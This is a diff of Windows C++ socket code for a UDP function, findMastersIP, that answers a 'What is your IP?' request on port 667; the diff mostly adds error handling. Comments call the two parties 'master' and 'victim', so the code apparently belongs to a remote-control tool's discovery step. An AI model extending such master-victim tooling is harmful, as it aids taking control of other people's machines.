@@ -7,22 +7,31 @@
 #include<windows.h>
 #pragma comment(lib, "ws2_32.lib")
 
+#include "Utils.h"
+
 uint32_t findMastersIP()
 {
     sockaddr_in sockinfo;
     sockaddr_in mastersinfo;
     SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s == INVALID_SOCKET)
+        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
     int error;
 
     std::string message, response;
     char* buf = new char[65536];
     int fromlen = sizeof(mastersinfo);
 
-    sockinfo.sin_addr.s_addr = inet_addr("0.0.0.0");
+    sockinfo.sin_addr.s_addr = getPrivateIP();
     sockinfo.sin_port = htons(667);
     sockinfo.sin_family = AF_INET;
 
-    bind(s, (sockaddr*)&sockinfo, sizeof sockinfo);
+    error = 1;
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&error, sizeof(error)))
+        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
+
+    if(bind(s, (sockaddr*)&sockinfo, sizeof sockinfo) < 0)
+        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;
 
     /*fixed messages for my "protocol"*/
     message = "What is your IP?";
@@ -31,8 +40,11 @@ uint32_t findMastersIP()
     /*wait for the master to ask me to connect*/
     do {
         error = recvfrom(s, buf, 65536, 0, (sockaddr*)&mastersinfo, &fromlen);
-        if (!error)
+        if (error < 0)
+        {
+            std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
             goto errorLable;
+        }
     } while (!std::string(buf)._Equal(message));
 
     /*the victim will broadcast to port 667 that he needs the master's ip*/
@@ -40,8 +52,9 @@ uint32_t findMastersIP()
     sockinfo.sin_port = mastersinfo.sin_port;
     sockinfo.sin_family = mastersinfo.sin_family;
 
-    sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
-    
+    error = sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
+    if (error < 0)
+        std::cout << "Send error <" << WSAGetLastError() << ">" << std::endl;
 
 errorLable:
     delete[] buf;
